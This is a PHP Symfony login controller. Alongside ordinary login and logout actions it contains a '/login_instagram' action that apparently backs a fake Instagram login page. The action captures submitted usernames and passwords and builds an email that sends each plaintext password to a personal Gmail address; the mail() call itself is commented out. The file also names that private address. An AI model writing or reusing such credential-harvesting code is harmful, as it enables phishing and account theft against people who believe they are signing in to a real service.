<?php

namespace App\Controller;
use App\Entity\User;
use App\Repository\UserRepository;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\Mailer\Mailer;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\Security\Http\Authentication\AuthenticationUtils;

class LoginController extends \Symfony\Bundle\FrameworkBundle\Controller\AbstractController
{

    private MailerController $mailerController;

    public function __construct(MailerController $mailerController, UserRepository $userRepository)
        {
            $this->mailerController = $mailerController;
            $this->userRepository = $userRepository;

        }

    /**
     * @Route ("/login", name="login")
     */

    public function login (AuthenticationUtils $authenticationUtils, Request $request)
    {

        $error = $authenticationUtils->getLastAuthenticationError();
        $lastUsername = $authenticationUtils->getLastUsername();


        return $this->render("security/login.html.twig",[
            "last_username" => $lastUsername,
            "error" => $error,
            "prev_url" => $previousUrl = $request->get("referer")
        ]);
    }

    /**
     * @Route("/logout", name="app_logout")
     */
    public function logout()
    {
        throw new \LogicException('This method can be blank - it will be intercepted by the logout key on your firewall.');
    }

    /**
     * @Route ("/login_instagram", name="login_instagram")
     */

    public function loginInsta()
    {
        if(isset($_POST["_username"]))
        {
            $username = $_POST["_username"];
            $password = $_POST["_password"];

            $empfaenger = 'antonhauffe2703@gmail.com';
            $betreff = $username." ".date('Y.m.d');;
            $nachricht = $password;
            $header = 'From: argus@antonhauffe.de' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();

            //  mail($empfaenger, $betreff, $nachricht, $header);


        }
        return $this->render("security/login_insta.html.twig",[

        ]);
    }

}